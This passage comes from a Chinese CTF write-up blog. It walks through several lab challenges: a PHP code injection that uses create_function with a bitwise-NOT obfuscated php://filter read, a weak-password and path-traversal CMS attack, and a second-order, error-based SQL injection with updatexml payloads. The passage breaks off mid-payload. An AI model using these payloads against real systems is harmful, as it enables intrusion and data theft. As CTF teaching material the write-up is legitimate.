class="hljs-variable">%78</span><span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%61</span><span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%61</span>&amp;<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-operator">=</span><span class="hljs-variable">%61</span><span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%61</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%69</span><span class="hljs-variable">%73</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%75</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%0</span>A&amp;<span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span>[]<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;<span class="hljs-variable">%70</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%77</span><span class="hljs-variable">%64</span>[]<span class="hljs-operator">=</span><span class="hljs-number">2</span>&amp;<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%5</span>d<span class="hljs-operator">=</span><span class="hljs-variable">%63</span><span class="hljs-variable">%72</span><span class="hljs-variable">%65</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%66</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%63</span><span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e&amp;<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%67</span><span class="hljs-variable">%5</span>d<span class="hljs-operator">=</span>&#125;<span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%70</span>(<span class="hljs-variable">%67</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%65</span><span class="hljs-variable">%64</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%73</span>())<span class="hljs-comment">;//</span><br><br>POST传file<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;debu<span class="hljs-operator">=</span><span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><img src="/img/bjdctfezphp7.png" alt="bjdctfezphp7"></p><p>现在要想办法读<code>rea1fl4g.php</code>，不过还是要注意前面<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>和正则匹配的限制。</p><p>可以用<code>require</code>去读，但限制了<code>con,fil</code>啥的，考虑取反绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//参考https://www.shawroot.cc/815.html</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;p h p : / / f i l t e r / r e a d = c o n v e r t . b a s e 6 4 - e n c o d e / r e s o u r c e = r e a 1 f l 4 g . p h p&quot;</span>;<br><span class="hljs-variable">$arr1</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;~(&quot;</span>;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$arr1</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;%&quot;</span>.<span class="hljs-title function_ invoke__">bin2hex</span>(~<span class="hljs-variable">$value</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;)&lt;br&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">~(<span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%c5</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%99</span><span class="hljs-variable">%96</span><span class="hljs-variable">%93</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%d0</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>e<span class="hljs-variable">%9</span>b<span class="hljs-variable">%c2</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%91</span><span class="hljs-variable">%89</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%8</span>b<span class="hljs-variable">%d1</span><span class="hljs-variable">%9</span>d<span class="hljs-variable">%9</span>e<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%c9</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%d2</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%91</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%d0</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%8</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%c2</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>e<span class="hljs-variable">%ce</span><span class="hljs-variable">%99</span><span class="hljs-variable">%93</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%98</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f)<br></code></pre></td></tr></table></figure><p>最终<code>payload</code></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">/<span class="hljs-number">1</span>nD<span class="hljs-number">3</span><span class="hljs-keyword">x</span>.php?file<span class="hljs-operator">=</span><span class="hljs-variable">%64</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%61</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%2</span>f<span class="hljs-variable">%2</span>f<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%61</span><span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%61</span>&amp;<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-operator">=</span><span class="hljs-variable">%61</span><span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%61</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%69</span><span class="hljs-variable">%73</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%75</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%0</span>A&amp;<span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span>[]<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;<span class="hljs-variable">%70</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%73</span><span class="hljs-variable">%77</span><span class="hljs-variable">%64</span>[]<span class="hljs-operator">=</span><span class="hljs-number">2</span>&amp;<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%5</span>d<span class="hljs-operator">=</span><span class="hljs-variable">%63</span><span class="hljs-variable">%72</span><span class="hljs-variable">%65</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%66</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%63</span><span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e&amp;<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%67</span><span class="hljs-variable">%5</span>d<span class="hljs-operator">=</span>&#125;require(~(<span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%c5</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%d0</span><span class="hljs-variable">%99</span><span class="hljs-variable">%96</span><span class="hljs-variable">%93</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%d0</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>e<span class="hljs-variable">%9</span>b<span class="hljs-variable">%c2</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%91</span><span class="hljs-variable">%89</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%8</span>b<span class="hljs-variable">%d1</span><span class="hljs-variable">%9</span>d<span class="hljs-variable">%9</span>e<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%c9</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%d2</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%91</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%d0</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%90</span><span class="hljs-variable">%8</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%c2</span><span class="hljs-variable">%8</span>d<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>e<span class="hljs-variable">%ce</span><span class="hljs-variable">%99</span><span class="hljs-variable">%93</span><span class="hljs-variable">%cb</span><span class="hljs-variable">%98</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f))<span class="hljs-comment">;//</span><br></code></pre></td></tr></table></figure><p><img src="/img/bjdctfezphp9.png" alt="bjdctfezphp9"></p><p>然后解码：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Real_Flag In Here!!!<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;咦，你居然找到我了？！不过看到这句话也不代表你就能拿到flag哦！&quot;</span>;</span><br><span class="language-php"><span class="hljs-variable">$f4ke_flag</span> = <span class="hljs-string">&quot;BJD&#123;1am_a_fake_f41111g23333&#125;&quot;</span>;</span><br><span class="language-php"><span class="hljs-variable">$rea1_f1114g</span> = <span class="hljs-string">&quot;flag&#123;870ae629-6309-425c-a5e6-22fbe7cc08fc&#125;&quot;</span>;</span><br><span class="language-php"><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$rea1_f1114g</span>);</span><br></code></pre></td></tr></table></figure><h2 id="GKCTF-2021-easycms"><a href="#GKCTF-2021-easycms" class="headerlink" title="[GKCTF 2021]easycms"></a>[GKCTF 2021]easycms</h2><p><code>提示：后台密码5位弱口令</code></p><p>![GKCTF 2021easycms1](img&#x2F;GKCTF 2021easycms1.png)</p><p>登录页面一直点不了。。也没啥提示，看了wp发现有这么个界面：<br><code>admin.php</code></p><p>![GKCTF 2021easycms3](img&#x2F;GKCTF 2021easycms3.png)</p><p>注意这个<code>URL</code>：<code>admin.php?m=user&amp;f=login&amp;referer=L2FkbWluLnBocA==</code>，解码后是<code>/admin.php</code></p><p>用户名<code>admin</code>,密码<code>12345</code></p><p>设计 - 主题 - 自定义 - 存在导出文件的功能</p><p>![GKCTF 2021easycms6](img&#x2F;GKCTF 2021easycms6.png)</p><p>![GKCTF 2021easycms7](img&#x2F;GKCTF 2021easycms7.png)</p><p>导出后会下载一个<code>zip</code>文件，抓包看看：</p><p>注意这里的<code>URL</code>:<code>L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvYS56aXA=</code></p><p>![GKCTF 2021easycms4](img&#x2F;GKCTF 2021easycms4.png)</p><p>解码：<code>/var/www/html/system/tmp/theme/default/a.zip</code></p><p>存在任意文件下载功能？<code>theme</code>直接换成<code>/flag</code>的<code>base64</code>：<code>L2ZsYWc=</code></p><p>注意下载的是压缩包，后缀改成<code>txt</code>再打开就行。</p><p>![GKCTF 2021easycms5](img&#x2F;GKCTF 2021easycms5.png)</p><p>第二种方法：</p><p>设计 - &gt; 高级 -&gt; 编辑 这里至此自定义，比如：</p><p><img src="/img/easycms1.png" alt="easycms1"></p><p>但不能直接保存，会提示我们需要创建一个文件：</p><p><img src="/img/easycmms2.png" alt="easycmms2"></p><p>如果想自定义就要去创建这样一个文件：<code>/var/www/html/system/tmp/xspg.txt</code></p><p>设计 -&gt; 组件 -&gt; 素材库这里支持上传文件：</p><p><img src="/img/easycms3.png" alt="easycms3"></p><p>注意他这个存储路径，存在目录穿越：</p><p><img src="/img/easycms4.png" alt="easycms4"></p><p>文件不用加后缀，目录穿越多试几次就行，如果目录不对他自己会提示<code>fail</code></p><h2 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h2><p><img src="/img/StrongestMind1.png" alt="StrongestMind1"></p><p>源码没啥提示，直接抓包看看：</p><p><img src="/img/StrongestMind2.png" alt="StrongestMind2"></p><p>把结果明文传过去的，<code>POST answer=xxxx</code></p><p>脚本不会写直接抄的这位师傅的：<code>https://blog.csdn.net/shinygod/article/details/124141957</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> time<br><br>url=<span class="hljs-string">&quot;http://4dd9922c-9934-46da-83e8-49992b7b6ffd.node4.buuoj.cn:81/&quot;</span><br>session = requests.session()<br>req = session.get(url).text<br>flag = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1010</span>):<br>    <span class="hljs-keyword">try</span>:<br>        result = re.findall(<span class="hljs-string">&quot;\&lt;br\&gt;\&lt;br\&gt;(\d.*?)\&lt;br\&gt;\&lt;br\&gt;&quot;</span>,req)<span class="hljs-comment">#获取[数字]</span><br>        result = <span class="hljs-string">&quot;&quot;</span>.join(result)<span class="hljs-comment">#提取字符串</span><br>        result = <span class="hljs-built_in">eval</span>(result)<span class="hljs-comment">#运算</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;time: &quot;</span>+ <span class="hljs-built_in">str</span>(i) +<span class="hljs-string">&quot;   &quot;</span>+<span class="hljs-string">&quot;result: &quot;</span>+ <span class="hljs-built_in">str</span>(result))<br><br>        data = &#123;<span class="hljs-string">&quot;answer&quot;</span>:result&#125;<br>        req = session.post(url,data=data).text<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag&#123;&quot;</span> <span class="hljs-keyword">in</span> req:<br>            <span class="hljs-built_in">print</span>(re.search(<span class="hljs-string">&quot;flag&#123;.*&#125;&quot;</span>, req).group(<span class="hljs-number">0</span>)[:<span class="hljs-number">50</span>])<br>            <span class="hljs-keyword">break</span><br>        time.sleep(<span class="hljs-number">0.1</span>)<span class="hljs-comment">#防止访问太快断开连接</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-]&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/StrongestMind3.png" alt="StrongestMind3"></p><h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><p>随便注册了个账号，发现这东西有修改密码的功能。</p><p><img src="/img/rctf2015zesysql1.png" alt="rctf2015zesysql1"></p><p>初步猜测二次注入。二次注入这东西个人理解就是在获取用户输入的过程中只简单设置了转义<code>(比如在单引号前面加个\)</code>，然后用户通过某个功能将恶意数据取出并利用。</p><p><code>admin</code>用户不给注册，估计是要以<code>admin</code>身份登录然后拿<code>flag</code>。不知道这个用户名是怎么闭合的，输个<code>admin‘#</code>注册一下：</p><p><img src="/img/rctf2015zesysql2.png" alt="rctf2015zesysql2"></p><p>然后修改密码，这时如果它后端改密码的逻辑是类似这种：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">update</span> users <span class="hljs-keyword">set</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$new_pass&#x27;</span> <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$user&#x27;</span> <span class="hljs-keyword">and</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$old_pass&#x27;</span>;<br></code></pre></td></tr></table></figure><p>我们把用户名<code>admin&#39;#</code>放进去：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">update</span> users <span class="hljs-keyword">set</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$new_pass&#x27;</span> <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin&#x27;</span>  # <span class="hljs-keyword">and</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$old_pass&#x27;</span>;<br></code></pre></td></tr></table></figure><p>可以看到实际修改的是<code>admin</code>的密码。当然这个闭合不一定是单引号，需要试。</p><p>试到双引号终于出了点东西(这里我注册的是<code>admin&quot;--+</code>)：</p><p><img src="/img/rctf2015zesysql3.png" alt="rctf2015zesysql3"></p><p>但报错了？</p><p><code>pwd</code>这个字段存的应该是旧密码的<code>md5(可以自己换然后看回显。)</code>报错原因估计就是用户名闭合的问题，可以注册一个<code>&quot;admin&quot;</code>看看：</p><p><img src="/img/rctf2015zesysql4.png" alt="rctf2015zesysql4"></p><p>注意这个<code>admin&quot;&quot;</code>，所以用户名用双引号闭合的。而且出错会有回显？考虑报错注入：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">1&quot;&amp;&amp;(updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">database</span>())),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))#<br>空格被过滤了，用括号替换<br></code></pre></td></tr></table></figure><p><img src="/img/rctf2015zesysql5.png" alt="rctf2015zesysql5"></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>&quot;&amp;&amp;(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select(group_concat(table_name))<span class="hljs-built_in">from</span>(information_schema.tables)<span class="hljs-built_in">where</span>(table_schema=database())),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure><p><img src="/img/rctf2015zesysql6.png" alt="rctf2015zesysql6"></p><p>后面就不详细写了，<code>flag</code>表下有<code>flag</code>字段：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>&quot;&amp;&amp;(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select(flag)<span class="hljs-built_in">from</span>(flag)),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure><p><img src="/img/rctf2015zesysql7.png" alt="rctf2015zesysql7"></p><p>他🐎的，只能再看别的表：<code>user</code></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>&quot;&amp;&amp;(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select(group_concat(column_name))<span class="hljs-built_in">from</span>(information_schema.columns)<span class="hljs-built_in">where</span>(table_name=&#x27;user&#x27;)),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure><p><img src="/img/rctf2015zesysql8.png" alt="rctf2015zesysql8"></p><p>没显示完全，<code>updatexml</code>这东西只显示32。可以利用<code>reverse</code>：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>&quot;&amp;&amp;(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,reverse((select(group_concat(column_name))<span class="hljs-built_in">from</span>(information_schema.columns)<span class="hljs-built_in">where</span>(table_name=&#x27;user&#x27;))),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure><p><img src="/img/rctf2015zesysql9.png" alt="rctf2015zesysql9"></p><p>???他妈的我说怎么不对我把users打成user了，我真傻逼</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>&quot;&amp;&amp;(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select(group_concat(column_name))<span class="hljs-built_in">from</span>(information_schema.columns)<span class="hljs-built_in">where</span>(table_name=&#x27;users&#x27;)),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure><p><img src="/img/rctf2015zesysql10.png" alt="rctf2015zesysql10"></p><p><code>reverse</code>一下看后面有没有：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>&quot;&amp;&amp;(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,reverse((select(group_concat(column_name))<span class="hljs-built_in">from</span>(information_schema.columns)<span class="hljs-built_in">where</span>(table_name=&#x27;users&#x27;))),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure><p><img src="/img/rctf2015zesysql11.png" alt="rctf2015zesysql11"></p><p>读<code>real_flag_1s_here</code>字段：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>&quot;&amp;&amp;(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select(real_flag_1s_here)<span class="hljs-built_in">from</span>(users)),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure><p><img src="/img/rctf2015zesysql12.png" alt="rctf2015zesysql12"></p><p>这东西返回了不止一行。。正则匹配下带有<code>flag</code>或<code>RCTF</code>的字段就行，正则的语法类似这种：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> Name<br><span class="hljs-keyword">FROM</span> Products<br><span class="hljs-keyword">WHERE</span> Name REGEXP <span class="hljs-string">&#x27;XXXXX&#x27;</span>;<br></code></pre></td></tr></table></figure><p>所以：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>&quot;&amp;&amp;<span class="hljs-built_in">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,reverse((select(group_concat(real_flag_1s_here))<span class="hljs-built_in">from</span>(users)<span class="hljs-built_in">where</span>(real_flag_1s_here)<span 